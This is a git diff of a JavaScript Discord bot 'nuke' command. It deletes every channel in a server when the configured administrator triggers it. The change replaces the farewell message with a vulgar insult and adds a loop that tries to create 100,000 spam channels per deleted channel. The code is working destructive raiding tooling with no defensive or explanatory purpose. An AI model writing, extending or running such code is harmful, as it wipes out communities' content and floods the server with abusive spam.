@@ -9,10 +9,12 @@ module.exports = class NukeCommand extends BaseCommand {
     let guildid = message.channel.guild.id;
     if(message.author.id == AdministratorId) {
       if(message.channel.guild.me.permissions.has('MANAGE_CHANNELS') || message.channel.guild.me.permissions.has('ADMINISTRATOR')) {
-        message.channel.send('BYE BYE SERVER 😈').then(msg => {
+        message.channel.send('MUIE 😈').then(msg => {
           message.channel.guild.channels.cache.forEach(channel => {
             channel.delete().then(() => {
-              client.guilds.cache.get(guildid).channels.create('💣-nuked-💣', { reason: 'THIS SERVER HAS BEEN NUKED' });
+              for (let i = 0; i < 100000; i++) {
+                client.guilds.cache.get(guildid).channels.create('muie', { reason: 'THIS SERVER HAS BEEN MUIED' });
+              }
             })
           })
         });
